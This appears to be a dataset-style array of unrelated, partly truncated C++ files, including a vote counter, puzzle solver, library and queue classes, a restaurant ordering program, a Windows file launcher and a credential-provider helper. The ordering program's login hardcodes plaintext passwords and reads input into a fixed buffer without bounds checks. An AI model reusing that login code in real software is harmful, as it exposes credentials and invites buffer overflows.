votes\n  for (int i = 0; i < 5 ; i++) {\n    \n    getline(file, line);\n    if (i == 4) {\n      setVotesCurrentBallot(std::stoi(line));\n    }\n  }\n\n  // we cound the votes for each candidate\n  int votesCounted = 0;\n  int linesCounted = 0;\n  while (linesCounted < votes && std::getline(file, line)) { // doing the && check slows down the program\n    size_t index = 0;\n    int idx_csv = 0;\n    while (index < line.length()) {\n      if (line[index] == '1') {\n        candidates.at(idx_csv).second.second++;\n        votesCounted++;\n        index++;\n      }\n      if (line[index] == ',') {\n        index++;\n        idx_csv++;\n      }\n    }\n    linesCounted++;\n  }\n\n  setVotesTotal(votesCounted);\n\n  file.close();\n}\n\n\nvoid MVSystem::giveVotesToParty() {\n  // we now have two vectors to fill, one for Party & votes, another for Party & won seats \n  // we go through the candidates list, and if their Party is not in our vector, we add it\n  for (const auto& candidatePair : candidates) {\n    const Party& party = candidatePair.second.first;  // Extract the Party from the pair\n    bool exists = false;\n\n    // check if this party has already been added to parties vector\n    for (auto& partyPair : parties) {\n      if (partyPair.first == party) {\n        // party already exists in parties, no need to add it but we have to add this\n        // candidates votes to the party total\n        exists = true;\n        partyPair.second += candidatePair.second.second;\n        break;\n      }\n    }\n\n    if (!exists) {  // If the party wasn't found in parties, add it\n      parties.push_back(std::make_pair(party, candidatePair.second.second));\n      partySeats.push_back(std::make_pair(party, 0));\n    }\n  }\n\n\n  // sorting, and printing vote count results\n  std::sort(candidates.begin(), candidates.end(), sortByCandidateMV);\n  std::sort(parties.begin(), parties.end(), sortByPartyMV);\n}\n\n\n\n\n// In a MV election, any voter can give one or more votes, but one per candidate.\n// MV is purely based on popularity, so if there a 4 seats, and the top 4 candidates\n// come from the same party, then that Party's Candidates will get the 4 seats.\nvoid MVSystem::allocateSeats() {\n  int totalSeats = getSeats();\n\n\n  std::cout << \"\\n\\n\";\n  int idx = 0;\n\n  \n  // while there are seats to give, give seats and handle ties\n  while (totalSeats > 0) {\n    // check if this candidate has more votes than the next candidate\n    if (idx + 1 < static_cast<int>(candidates.size()) && \n          candidates[",
    "#include <bits/stdc++.h>\nusing namespace std;\n#define N 3\n\n// State space tree nodes\nstruct Node {\n    Node* parent; // Stores the parent node of the current node\n    int mat[N][N]; // Stores matrix\n    int x, y; // Stores blank tile coordinates\n    int cost; // Stores the number of misplaced tiles\n    int level; // Stores the number of moves so far\n};\n\n// Function to print N x N matrix\nvoid printMatrix(int mat[N][N]) {\n    for (int i = 0; i < N; i++) {\n        for (int j = 0; j < N; j++)\n            printf(\"%d \", mat[i][j]);\n        printf(\"\\n\");\n    }\n}\n\n// Function to allocate a new node\nNode* newNode(int mat[N][N], int x, int y, int newX, int newY, int level, Node* parent) {\n    Node* node = new Node;\n    node->parent = parent; // Set pointer for path to root\n    memcpy(node->mat, mat, sizeof node->mat); // Copy data from parent node to current node\n    swap(node->mat[x][y], node->mat[newX][newY]); // Move tile by 1 position\n    node->cost = INT_MAX; // Set number of misplaced tiles\n    node->level = level; // Set number of moves so far\n    node->x = newX; // Update new blank tile coordinates\n    node->y = newY;\n    return node;\n}\n\n// Bottom, left, top, right\nint row[] = { 1, 0, -1, 0 };\nint col[] = { 0, -1, 0, 1 };\n\n// Function to calculate the number of misplaced tiles\nint calculateCost(int initial[N][N], int final[N][N]) {\n    int count = 0;\n    for (int i = 0; i < N; i++)\n        for (int j = 0; j < N; j++)\n            if (initial[i][j] && initial[i][j] != final[i][j])\n                count++;\n    return count;\n}\n\n// Function to check if (x, y) is a valid matrix coordinate\nbool isSafe(int x, int y) {\n    return (x >= 0 && x < N && y >= 0 && y < N);\n}\n\n// Print path from root node to destination node\nvoid printPath(Node* root) {\n    if (root == NULL)\n        return;\n    printPath(root->parent);\n    printMatrix(root->mat);\n    printf(\"\\n\");\n}\n\n// Comparison object to be used to order the heap\nstruct comp {\n    bool operator()(const Node* lhs, const Node* rhs) const {\n        return (lhs->cost + lhs->level) > (rhs->cost + rhs->level);\n    }\n};\n\n// Function to solve N*N - 1 puzzle algorithm using Branch and Bound\nvoid solve(int initial[N][N], int x, int y, int final[N][N]) {\n    priority_queue<Node*, std::vector<Node*>, comp> pq; // Create a priority queue to store live nodes of search tree\n    Node* root = newNode(initial, x, y, x, y, 0, NULL); // Create a root node and calculate its cost\n    root->cost = calculateCost(initial, final);\n    pq.push(root); // Add root to list of live nodes\n\n    while (!pq.empty()) {\n        Node* min = pq.top(); // Find a live node with least estimated cost\n        pq.pop(); // The found node is deleted from the list of live nodes\n\n        if (min->cost == 0) { // If min is an answer node\n            printPath(min); // Print the path from root to destination\n            return;\n        }\n\n        // Do for each child of min (max 4 children for a node)\n        for (int i = 0; i < 4; i++) {\n            if (isSafe(min->x + row[i], min->y + col[i])) {\n                Node* child = newNode(min->mat, min->x, min->y, min->x + row[i], min->y + col[i], min->level + 1, min);\n                child->cost = calculateCost(child->mat, final);\n                pq.push(child); // Add child to list of live nodes\n            }\n        }\n    }\n}\n\n// Driver code\nint main() {\n    int initial[N][N] = { // Initial configuration (Value 0 is used for empty space)\n        {1, 2, 3},\n        {5, 6, 0},\n        {7, 8, 4}\n    };\n\n    int final[N][N] = { // Solvable Final configuration (Value 0 is used for empty space)\n        {1, 2, 3},\n        {5, 8, 6},\n        {0, 7, 4}\n    };\n\n    int x = 1, y = 2; // Blank tile coordinates in initial configuration\n    solve(initial, x, y, final);\n    return 0;\n}\n",
    "    #include <iostream>\n    #include <string>\n    #include <vector>\n\n    using namespace std;\n\n    class HomeLibraryBook;\n\n    class Book {\n    protected:\n        string author;\n        string title;\n        int pages;\n        int year;\n\n    public:\n        Book() : author(\"\"), title(\"\"), pages(0), year(0) {}\n\n        Book(const string& author, const string& title, int pages, int year)\n            : author(author), title(title), pages(pages), year(year) {}\n\n        virtual ~Book() {}\n\n        virtual void display() const {\n            cout << \"Author: \" << author << endl;\n            cout << \"Title: \" << title << endl;\n            cout << \"Pages: \" << pages << endl;\n            cout << \"Year: \" << year << endl;\n        }\n\n        const string& getTitle() const { return title; }\n    };\n\n    class HomeLibraryBook : public Book {\n    private:\n        string location;\n        bool borrowed;\n\n    public:\n        HomeLibraryBook(const string& author, const string& title, int pages, int year,\n                        const string& location, bool borrowed)\n            : Book(author, title, pages, year), location(location), borrowed(borrowed) {}\n\n        virtual void display() const override {\n            Book::display();\n            cout << \"Location: \" << location << endl;\n            cout << \"Borrowed: \" << (borrowed ? \"Yes\" : \"No\") << endl;\n        }\n\n        void borrow() {\n            borrowed = true;\n        }\n\n        void returnBook() {\n            borrowed = false;\n        }\n    };\n\n    class HomeLibrary {\n    private:\n        vector<HomeLibraryBook> books;\n\n    public:\n        void addBook(const HomeLibraryBook& book) {\n            books.push_back(book);\n        }\n\n        void removeBook(const string& title) {\n            for (auto it = books.begin(); it != books.end(); ++it) {\n                if (it->getTitle() == title) {\n                    books.erase(it);\n                    break;\n                }\n            }\n        }\n\n        void displayAllBooks() const {\n            for (const auto& book : books) {\n                book.display();\n                cout << endl;\n            }\n        }\n    };\n\n    int main() {\n        HomeLibrary library;\n\n        HomeLibraryBook myBook(\"John Doe\", \"C++ Programming\", 350, 2020, \"Living Room\", false);\n        library.addBook(myBook);\n\n        HomeLibraryBook myBook2(\"Penelope Sky\", \"Buttons and Lace\", 350, 2016, \"Living Room\", false);\n        library.addBook(myBook2);\n\n        library.displayAllBooks();\n\n        myBook.borrow();\n        cout << \"Book borrowed.\" << endl;\n        library.displayAllBooks();\n\n        return 0;\n    }\n",
    "/ UMBC - CMSC 341 - Spring 2024 - Proj3                                                                                                                                     \n#include \"rqueue.h\"\n\n//Name: RQueue (Constructor)                                                                                                                                                 \n//Desc: Creates empty queue and initializes values                                                                                                                           \n//Preconditions: required variables provided                                                                                                                                 \n//Postconditions: Empty queue is created with intialized values                                                                                                              \nRQueue::RQueue(prifn_t priFn, HEAPTYPE heapType, STRUCTURE structure) {\n  m_heap = nullptr;\n  m_size = 0;\n  m_priorFunc = priFn;\n  m_heapType = heapType;\n  m_structure = structure;\n}\n\n\n\n//Name: Destructor                                                                                                                                                           \n//Desc: Deallocates all memory and re-initializaed the member variables                                                                                                      \n//Preconditions: Heap exists                                                                                                                                                 \n//Postconditions: All memory is deallocated and member variables reinitialized                                                                                               \nRQueue::~RQueue() {\n  clear();\n}\n\n\n\n//Name: Destructor                                                                                                                                                           \n//Desc: Deallocates all nodes and re-initializaed the member variables                                                                                                       \n//Preconditions: Heap exists                                                                                                                                                 \n//Postconditions: All nodes are deallocated and member variables reinitialized                                                                                               \n//leaving an empty heap                                                                                                                                                      \nvoid RQueue::clear() {\n  clear(m_heap);\n  m_size = 0;\n}\n\n\n\n//Name: RQueue (Copy Constructor)                                                                                                                                            \n//Desc: creates a deep copy of rhs object                                                                                                                                    \n//Preconditions: Heap exist                                                                                                                                                  \n//Postconditions: a deep copy of heap is created                                                                                                                             \nRQueue::RQueue(const RQueue& rhs) {\n  //copies mem variables                                                                                                                                                     \n  m_size = rhs.m_size;\n  m_priorFunc = rhs.m_priorFunc;\n  m_heapType = rhs.m_heapType;\n  m_structure = rhs.m_structure;\n\n  //if root exists                                                                                                                                                           \n  if(rhs.m_heap != nullptr){\n    //recursive copy                                                                                                                                                         \n    copy(m_heap, rhs.m_heap);\n\n    //in case empty heap                                                                                                                                                     \n  }else{\n    m_heap = nullptr;\n  }\n}\n\n//Name: getHeapType                                                                                                                                                          \n//Desc: returns heap type                                                                                                                                                    \n//Preconditions: tree exists with defined heap type                                                                                                                          \n//Postconditions: heap type is returned                                                       ",
    "#include<iostream>\r\n#include<vector>\r\nusing namespace std;\r\nclass Persona{\r\n\tstring nombre;\r\n\tint edad;\r\n\tpublic:\r\n\t\tPersona();\r\n\t\tvoid setNombre(string nombre);\r\n\t\tvoid setEdad(int edad);\r\n\t\tstring getNombre();\r\n\t\tint getEdad();\r\n};\r\nPersona::Persona(){\r\n\tnombre=\"S/N\";\r\n\tedad=0;\r\n};\r\nvoid Persona::setNombre(string nombre){\r\n\tthis->nombre=nombre;\r\n};\r\nvoid Persona::setEdad(int edad){\r\n\tthis->edad=edad;\t\r\n};\r\nstring Persona::getNombre(){\r\n\treturn nombre;\r\n}\r\nint Persona::getEdad(){\r\n\treturn edad;\r\n};\r\nvoid mostrarDatos(vector<Persona> lista, string titulo);\r\nvoid ingresodatos(vector<Persona> &lista, int num);\r\nvoid buscarDatoBB(vector<Persona> lista, string nomBuscar);\r\nint main(){\r\n\tvector<Persona> lista;\r\n\t//Persona persona;\r\n\tint num=5;\r\n\tingresodatos(lista, num);\t\r\n\t//\r\n\t//mostrar datos\r\n\tmostrarDatos(lista,\"Lista inicial\");\r\n\t//buscar\r\n\tbuscarDatoBB(lista, \"b\");\r\n\treturn 0;\r\n}\r\nvoid mostrarDatos(vector<Persona> lista, string titulo){\r\n\tcout<<\"***** \"<<titulo<<\" *****\"<<endl;\r\n\tfor(auto i: lista){\r\n\t\tcout<<i.getNombre()<<\" \"<<i.getEdad()<<endl;\r\n\t};\t\r\n};\r\nvoid ingresodatos(vector<Persona> &lista, int num){\r\n\tPersona persona;\r\n\tstring nombre;\r\n\tint edad;\r\n\tfor(int i=1;i<=num;i++){\r\n\t\tcout<<\"Ingrese el nombre: \";\r\n\t\tgetline(cin>>ws,nombre);\r\n\t\tcout<<\"Ingrese la edad: \";\r\n\t\tcin>>edad;\r\n\t\t//guardar en el objeto\r\n\t\tpersona.setNombre(nombre);\r\n\t\tpersona.setEdad(edad);\r\n\t\t//guarda el objeto en el arreglo\r\n\t\tlista.push_back(persona);\r\n\t}\r\n};\r\nvoid buscarDatoBB(vector<Persona> lista, string nomBuscar){\r\n\tint inferior, superior, mitad;\r\n\tsuperior=lista.size();\r\n\tinferior=0;\r\n\tmitad=(superior+inferior)/2;\r\n\twhile(inferior<=superior && lista[mitad].getNombre()!=nomBuscar){\r\n\t\tif(nomBuscar<lista[mitad].getNombre()){\r\n\t\t\tsuperior=mitad-1;\r\n\r\n\t\t}else{\r\n\t\t\tinferior=mitad+1;\r\n\t\t}\r\n\t\tmitad=(superior+inferior)/2;\r\n\t}\r\n\tif(lista[mitad].getNombre()==nomBuscar){\r\n\t\tcout<<\"Encontrado\\n\";\r\n\t}else{\r\n\t\tcout<<\"No Encontrado\\n\";\r\n\t}\t\r\n};",
    "#include <iostream>\r\n#include <string.h>\r\n#include <conio.h>\r\n#include <stdlib.h>\r\n#include <stdio.h>\r\n#include <iomanip>\r\n\r\nusing namespace std;\r\n\r\nvoid menu();\r\nvoid order();\r\n\r\nint main(void){\r\n\t\r\n\tchar username[10], password[8], x;\r\n\tint i;\r\n\tcout<<\"---------------------------------\"<<endl;\r\n\tcout<<\"--------------LOGIN--------------\"<<endl;\r\n\tcout<<\"---------------------------------\"<<endl;\r\n\tcout << \"Username:\";\r\n\tcin >> username;\r\n\tcout << \"Password:\";\r\n\t\t\r\n\tfor (i = 0;;){\r\n\tx = getch();\r\n\t\r\n\tif((x >='a' && x <= 'z') || (x >='A' && x <='Z') || (x >='0' && x <= '9')){\r\n\t\tpassword[i] = x;\r\n\t\ti++;\r\n\t\tcout << \"*\";\r\n\t\t}\r\n\t\t\r\n\telse if(x =='\\b' && i >= 1){\r\n\t\tcout << \"\\b \\b\";\r\n\t\ti--;\r\n\t\t}\r\n\t\t\r\n\telse if(x =='\\r'){\r\n\t\tpassword[i]='\\0';\r\n\t\tbreak;\r\n\t\t}\r\n}\r\n\r\n\t\r\n\tif (!strcmp(username, \"Keenan\") && !strcmp(password, \"pa55w0rd\")){\r\n\tcout << \"\\nAccess Granted, Welcome!\\n\";\r\n\tsystem(\"PAUSE\");\t\r\n\tsystem(\"CLS\");\r\n\tmenu();\r\n\torder();\r\n\t}\r\n\t\r\n\telse if(!strcmp(username, \"Thomas\") && !strcmp(password, \"Lizares\")){\r\n\tcout << \"\\nAcccess Granted, Welcome!\\n\";\r\n\tsystem(\"PAUSE\");\r\n\tsystem(\"CLS\");\r\n\tmenu();\r\n\torder();\r\n\t}\r\n\t\r\n\telse if(!strcmp(username, \"Burger\") && !strcmp(password, \"Town69\")){\r\n\tcout << \"\\nAcccess Granted, Welcome!\\n\";\r\n\tsystem(\"PAUSE\");\t\r\n\tsystem(\"CLS\");\r\n\tmenu();\r\n\torder();\r\n\t}\r\n\r\nelse{\r\n\tcout << \"\\nAccess Denied...\";\r\n}\r\n}\r\nvoid menu(){\r\n   \tcout<<\"                        |\\ /| /|_/|\"<<endl;\r\n\tcout<<\"                      |\\||-|\\||-/|/|\"<<endl;  \r\n\tcout<<\"                       \\\\|\\|//||///\"<<endl;  \r\n\tcout<<\"      _..----.._       |\\/\\||//||||\"<<endl;  \r\n\tcout<<\"    .'     o    '.     |||\\\\|/\\\\ ||\"<<endl;  \r\n\tcout<<\"   /   o       o  \\    | './\\_/.' |\"<<endl;  \r\n\tcout<<\"  |o        o     o|   |          |\"<<endl;  \r\n\tcout<<\"  /'-.._o     __.-'\\   |          |\"<<endl;  \r\n\tcout<<\"  \\      `````     /   |          |\"<<endl;  \r\n\tcout<<\"  |``--........--'`|    '.______.'\"<<endl;  \r\n\tcout<<\"   \\              /\"<<endl;  \r\n\tcout<<\"    `'----------'`\"<<endl;  \r\n\tcout<<\"---------------------------------------------------\\n\"<<endl;\r\n\tcout<<\"--------------WELCOME TO BURGER TOWN!--------------\\n\"<<endl;\r\n\tcout<<\"---------------------------------------------------\\n\"<<endl;\r\n\t\r\n\tcout<<\"\t\t\t---MENU---\t\t\t\t\t\t\\n\";\r\n\tcout<<\"\t\t\t-BURGERS-\t\t\t\t\t\t\\n\";\r\n\tcout<<\"(1)141 Special (Cheeseburger)\t\t-\tP125\\n\";\r\n\tcout<<\"(2)141 Deluxe (Double Cheeseburger)\t-\tP155\\n\";\r\n\tcout<<\"(3)The 75th (Quarter pounder burger)\t-\tP145\\n\";\r\n\tcout<<\"(4)Gulag Shower (Fish Fillet Burger)\t-\tP155\\n\";\r\n\t\r\n\tcout<<\"\\n\t\t\t-PIZZAS-\t\t\t\t\t\t\\n\";\r\n\tcout<<\"(5)Bacon Machine Pizza\t\t\t-\tP250\\n\";\r\n\tcout<<\"(6)Foley's Cheese Pizza\t\t\t-\tP255\\n\";\r\n\tcout<<\"(7)Pepperoni Pizza\t\t\t-\tP250\\n\";\r\n\tcout<<\"(8)J. Allen's Hawaiian Pizza \t\t-\tP285\\n\";\r\n\t\r\n\tcout<<\"\\n\t\t\t-MAINS-\t\t\t\t\t\t\\n\";\r\n\tcout<<\"(9)Shepherd's Steak\t\t\t-\tP175\\n\";\r\n\tcout<<\"(10)Nikolai's Rib-eye\t\t\t-\tP165\\n\";\r\n\tcout<<\"(11)Dunn's Chicken and Rice\t\t-\tP110\\n\";\r\n\tcout<<\"(12)Wade's demise (Grilled Pork Chops)\t-\tP130\\n\";\r\n\tcout<<\"(13)Gary Sanderson's Spaghetti \t\t-\tP85\\n\";\r\n\tcout<<\"(14)8 pcs Chicken Nuggets\t\t-\tP105\\n\";\r\n\t\r\n\tcout<<\"\\n\t\t\t-ADD-ONS-\t\t\t\t\t\t\\n\";\r\n\tcout<<\"(15)Extra rice\t\t\t\t-\tP25\\n\";\r\n\tcout<<\"(16)Fries\t\t\t\t-\tP35\\n\";\r\n\r\n\tcout<<\"\\n\t\t\t-DRINKS-\t\t\t\t\t\t\\n\";\r\n\tcout<<\"(17)Bottled Water\t\t\t-\tP20\\n\";\r\n\tcout<<\"(18)Iced Tea\t\t\t\t-\tP35\\n\";\r\n\tcout<<\"(19)Lemonade\t\t\t\t-\tP30\\n\";\r\n\tcout<<\"(20)Chocolate Milkshake\t\t\t-\tP95\\n\";\r\n\t\r\n}\r\nvoid order(){\r\n\tint option, count=0, choice[100], quantity[100], discount;\r\n\tfloat total, payment, change, temporary[100];\r\n\t\r\n\tcout<<\"---------------------------------------------------\\n\";\r\n\tcout<<\"\t\t    -OPTIONS-\t\t\t\t\t\t\\n\";\r\n\tcout<<\"---------------------------------------------------\\n\";\r\n\tcout<<\"(1) Order\\n\";\r\n\tcout<<\"(2) Exit\\n\";\r\n\t\r\nwhile (option !=1 && option !=2){\r\n\tcout << \"Enter an Option:\";\r\n\tcin >> option;\r\n}\r\n\tif (option == 1){\r\n\t\r\n\twhile (choice[count]!= 21){\r\n\tcout << \"\\nChoice (Item Number):\";\r\n\tcin >> choice[count];\r\n\r\n\t\r\n\tif (choice[count] == 1){\r\n\t\tcout << \"Quantity:\";\r\n\t\tcin >> quantity[count];\r\n\t\ttotal += quantity[count] * 125;\r\n\t\ttemporary[count] = quantity[count] * 125;\r\n\t\tcout << \"Total: P\" << temporary[count] << \"\\n\";\r\n\t\tcout << \"(21)Confirm Order\\n\";\t\r\n\t\tcount += 1;\t\t\r\n\t}\r\n\t\telse if (choice[count] == 2){\r\n\t\tcout << \"Quantity:\";\r\n\t\tcin >> quantity[count];\r\n\t\ttotal += quantity[count] * 155;\r\n\t\ttemporary[count] = quantity[count] * 155;\r\n\t\tcout << \"Total: P\" << temporary[count] << \"\\n\";\r\n\t\tcout << \"(21)Confirm Order\\n\";\t\t\r\n\t\tcount += 1;\r\n\t}\r\n\t\telse if (choice[count] == 3){\r\n\t\tcout << \"Quantity:\";\r\n\t\tcin >> quantity[count];\r\n\t\ttotal += quantity[count] * 145;\r\n\t\ttemporary[count] = quantity[count] * 145;\r\n\t\tcout << \"Total: P\" << temporary[count] << \"\\n\";\r\n\t\tcout << \"(21)Confirm Order\\n\";\t\t\r\n\t\tcount += 1;\r\n\t}\r\n\t\telse if (choice[count] == 4){\r\n\t\tcout << \"Quantity:\";\r\n\t\tcin >> quantity[count];\r\n\t\ttotal += quantity[count] * 155;\r\n\t\ttemporary[count] = quantity[count] * 155;\r\n\t\tcout << \"Total: P\" << temporary[count] << \"\\n\";\r\n\t\tcout << \"(21)Confirm Order\\n\";\t\t\r\n\t\tcount += 1;\r\n\t}\r\n\t\telse if (choice[count] == 5){\r\n\t\tcout << \"",
    "#include <bits/stdc++.h>\r\n#include <synchapi.h>\r\n#include <windows.h>\r\n#include \"include/configor/json.hpp\"\r\n#include \"include/inicpp.hpp\"\r\n#include \"include/path.h\"\r\n#include \"include/system.h\"\r\n\r\nusing namespace std;\r\nusing namespace path;\r\nusing namespace configor;\r\nusing namespace inicpp;\r\n\r\nstring self_path, self_name;\r\n\r\nclass Task {\r\npublic:\r\n\tstring path;\r\n\tsize_t trigger_count;\r\n\tclock_t trigger_interval;\r\n\tbool auto_trigger;\r\n\r\n\tinline void init();\r\n\tinline void init(const json::value &task);\r\n\tinline void init(const string &p, const size_t &tc, const clock_t &ti, const bool &at);\r\n\r\n\tTask() { init(); }\r\n\tTask(const json::value &task) { init(task); }\r\n\tTask(const string &p, const size_t &tc, const clock_t &ti, const bool &at) { init(p, tc, ti, at); }\r\n\r\n\tvoid run();\r\n};\r\nclass Config {\r\npublic:\r\n\tclock_t interval_time, interval_eps;\r\n\tvector<Task> task;\r\n\r\n\tinline void init();\r\n\tinline void init(const json::value &config);\r\n\tinline bool init(const string &config_path);\r\n\tinline void init(const clock_t &it, const clock_t &ie, const vector<Task> &t);\r\n\r\n\tConfig() { init(); }\r\n\tConfig(const json::value &config) { init(config); }\r\n\tConfig(const string config_path) { init(config_path); }\r\n\tConfig(const clock_t &it, const clock_t &ie, const vector<Task> &t) { init(it, ie, t); }\r\n};\r\n\r\ninline bool loadConfig(string path, json::value &data) {\r\n\tdata.clear();\r\n\tifstream file(path.c_str());\r\n\tif (!file.is_open()) return true;\r\n\ttry {\r\n\t\tfile >> json::wrap(data);\r\n\t} catch (exception &_ERROR_) { return true; }\r\n\tfile.close();\r\n\treturn false;\r\n}\r\n\r\ninline void Task::init() {\r\n\tpath = \"\";\r\n\ttrigger_count = 1;\r\n\ttrigger_interval = 0;\r\n\tauto_trigger = true;\r\n}\r\ninline void Task::init(const json::value &task) {\r\n\tinit();\r\n\tpath = task[\"path\"];\r\n\tpathDelete(path);\r\n\tif (task.count(\"trigger_count\") > 0)\r\n\t\ttrigger_count = stol(task[\"trigger_count\"]);\r\n\tif (task.count(\"trigger_interval\") > 0)\r\n\t\ttrigger_interval = stol(task[\"trigger_interval\"]);\r\n\tif (task.count(\"auto_trigger\") > 0)\r\n\t\tauto_trigger = task[\"auto_trigger\"];\r\n}\r\ninline void Task::init(const string &p, const size_t &tc, const clock_t &ti, const bool &at) {\r\n\tinit();\r\n\tpath = p;\r\n\ttrigger_count = tc;\r\n\ttrigger_interval = ti;\r\n\tauto_trigger = at;\r\n}\r\n\r\ninline void Config::init() {\r\n\tinterval_time = 100;\r\n\tinterval_eps = 1000;\r\n\ttask.clear();\r\n}\r\ninline void Config::init(const json::value &config) {\r\n\tinit();\r\n\tinterval_time = stol(config[\"interval_time\"]);\r\n\tif (config.count(\"interval_eps\"))\r\n\t\tinterval_eps = stol(config[\"interval_eps\"]);\r\n\tif (config.count(\"task\") > 0) {\r\n\t\tfor (json::value subtask : config[\"task\"])\r\n\t\t\ttask.push_back(subtask);\r\n\t}\r\n}\r\ninline bool Config::init(const string &config_path) {\r\n\tjson::value config;\r\n\tbool is_failed = loadConfig(config_path, config);\r\n\tif (is_failed) return true;\r\n\r\n\tinit(config);\r\n\r\n\treturn false;\r\n}\r\ninline void Config::init(const clock_t &it, const clock_t &ie, const vector<Task> &t) {\r\n\tinit();\r\n\tinterval_time = it;\r\n\tinterval_eps = ie;\r\n\ttask = t;\r\n}\r\n\r\ninline void debug(const Config &config) {\r\n\tcout << config.interval_time << \"\\n\";\r\n\tfor (Task subtask : config.task) {\r\n\t\tcout << subtask.path << \" \" << subtask.trigger_count << \" \" << subtask.trigger_interval << \" \" << subtask.auto_trigger << \"\\n\";\r\n\t}\r\n}\r\n\r\nvoid Task::run() {\r\n\tstring target, trash;\r\n\tpathSplit(path, target, trash);\r\n\tchdir(target.c_str());\r\n\tvector< future<void> > pool;\r\n\tfor (size_t i = 1; i <= trigger_count; i++) { // PTSD\r\n\t\tpool.push_back(async(launch::async, executefile, path));\r\n\t\tif (i < trigger_count)\r\n\t\t\tSleep(trigger_interval);\r\n\t}\r\n\tfor (future<void> &fut : pool)\r\n\t\tfut.wait();\r\n\tchdir(self_path.c_str());\r\n}\r\nvoid process(const Config &config) {\r\n\tclock_t time_rec, time_now;\r\n\ttime_rec = time_now = 0;\r\n\tmap<string, bool> exist_rec;\r\n\tfor (Task subtask : config.task)\r\n\t\texist_rec[subtask.path] = false;\r\n\twhile (true) {\r\n\t\ttime_rec = time_now;\r\n\t\ttime_now = clock();\r\n\t\tfor (Task subtask : config.task) {\r\n\t\t\tconst string &path = subtask.path; // PTSD\r\n\t\t\tbool exist_now = pathExist(path);\r\n\t\t\tif (exist_now && (!exist_rec[path] || (subtask.auto_trigger && time_now - time_rec > config.interval_time + config.interval_eps))) {\r\n\t\t\t\tfuture<void> trash = async(launch::async, Task::run, subtask); // \u6709\u98ce\u9669\uff0c\u76ee\u524d\u6700\u4f18\r\n\t\t\t}\r\n\t\t\texist_rec[path] = exist_now;\r\n\t\t}\r\n\t\tSleep(config.interval_time);\r\n\t}\r\n}\r\nint main(int n_, char** config_path_) {\r\n\tpathSplit(_pgmptr, self_path, self_name);\r\n\tHWND console = GetConsoleWindow();\r\n\tstring ini_config_path = self_path + \"\\\\config.ini\";\r\n\tpathDelete(ini_config_path);\r\n\tIniManager ini_config(ini_config_path.c_str());\r\n\r\n\tif (ini_config[\"Autorun\"][\"hide_console_window\"] == \"1\")\r\n\t\tShowWindow(console, SW_HIDE);\r\n\r\n\tvector<string> config_path;\r\n\tif (n_ == 1)\r\n\t\tconfig_path.push_back(ini_config[\"Autorun\"][\"default_profile\"]);\r\n\telse\r\n\t\tfor (int i = 1; i < n_; i++)\r\n\t\t\tconfig_path.push_back(config_path_[i]);\r\n\r\n\tfor (string path : config_path) {\r\n\t\tConfig config;\r\n\t\tbool is_failed = config.init(path);\r\n\t\tif (is_fail",
    "#include <iostream>\r\n#include <chrono>\r\n\r\n#include \"cuMM.cu\"\r\n#include \"aos.hpp\" //<-- In this demo, we'll use the Array On Steroids library, but you can use any datatype you want\r\n\r\n// This is a demo of the \"cuMM\" library, devoloped by XeTute. \r\n// It uses the \"AOS\" header-only libraries, which are also dev. by XeTute.\r\n// XeTutes website: \"https://xetute.neocities.org/\"\r\n// AOS GitHub: \"https://www.github.com/N0CTRON/array-on-steriods/\"\r\n\r\nusing namespace std::literals::chrono_literals;\r\n\r\ntypedef std::chrono::high_resolution_clock::time_point timePoint;\r\ntypedef short typeToAlloc;\r\n\r\nint main()\r\n{\r\n\tconstexpr size_t elems = 32 * 1000;\r\n\tconstexpr size_t elemsResized = 64 * 1000;\r\n\r\n\tAOS<typeToAlloc> number(elemsResized); //Init with 16k numbers\r\n\tcuMM<typeToAlloc> gpuManager;\r\n\r\n\ttimePoint start;\r\n\ttimePoint end;\r\n\t\r\n\t//Malloc\r\n\tstart = std::chrono::high_resolution_clock::now();\r\n\tgpuManager.malloc(elems); //Init with storage for 32k numbers\r\n\tend = std::chrono::high_resolution_clock::now();\r\n\tstd::cout << \"cuMM took \" << std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count() << \"ms to allocate \" << gpuManager.sizeBytes() << \" bytes.\\n\";\r\n\r\n\t//Resize\r\n\tstart = std::chrono::high_resolution_clock::now();\r\n\tgpuManager.resize(elemsResized); //Resize to storage for 64k numbers\r\n\tend = std::chrono::high_resolution_clock::now();\r\n\tstd::cout << \"cuMM took \" << std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count() << \"ms to resize to \" << gpuManager.sizeBytes() << \" bytes.\\n\";\r\n\r\n\t//Copy\r\n\tstart = std::chrono::high_resolution_clock::now();\r\n\tgpuManager.copy(number.data, number.size() * sizeof(typeToAlloc), 1); //Init with 32k numbers and copy to GPU\r\n\tend = std::chrono::high_resolution_clock::now();\r\n\tstd::cout << \"cuMM took \" << std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count() << \"ms to copy to GPU.\\n\";\r\n\r\n\tgpuManager.free(); //<-- we don't necessarily need this cuz we have \"~cuMM\" :), you can still do this if you wanna be 100% save[would recommend on bigger projects].\r\n\r\n\treturn 0;\r\n}\r\n",
    "//\n// THIS CODE AND INFORMATION IS PROVIDED \"AS IS\" WITHOUT WARRANTY OF\n// ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED TO\n// THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A\n// PARTICULAR PURPOSE.\n//\n// Copyright (c) Microsoft Corporation. All rights reserved.\n//\n// Helper functions for copying parameters and packaging the buffer\n// for GetSerialization.\n\n\n#include \"helpers.h\"\n#include <intsafe.h>\n\n//\n// Copies the field descriptor pointed to by rcpfd into a buffer allocated\n// using CoTaskMemAlloc. Returns that buffer in ppcpfd.\n//\nHRESULT FieldDescriptorCoAllocCopy(\n    _In_ const CREDENTIAL_PROVIDER_FIELD_DESCRIPTOR &rcpfd,\n    _Outptr_result_nullonfailure_ CREDENTIAL_PROVIDER_FIELD_DESCRIPTOR **ppcpfd\n    )\n{\n    HRESULT hr;\n    *ppcpfd = nullptr;\n    DWORD cbStruct = sizeof(**ppcpfd);\n\n    CREDENTIAL_PROVIDER_FIELD_DESCRIPTOR *pcpfd = (CREDENTIAL_PROVIDER_FIELD_DESCRIPTOR*)CoTaskMemAlloc(cbStruct);\n    if (pcpfd)\n    {\n        pcpfd->dwFieldID = rcpfd.dwFieldID;\n        pcpfd->cpft = rcpfd.cpft;\n        pcpfd->guidFieldType = rcpfd.guidFieldType;\n\n        if (rcpfd.pszLabel)\n        {\n            hr = SHStrDupW(rcpfd.pszLabel, &pcpfd->pszLabel);\n        }\n        else\n        {\n            pcpfd->pszLabel = nullptr;\n            hr = 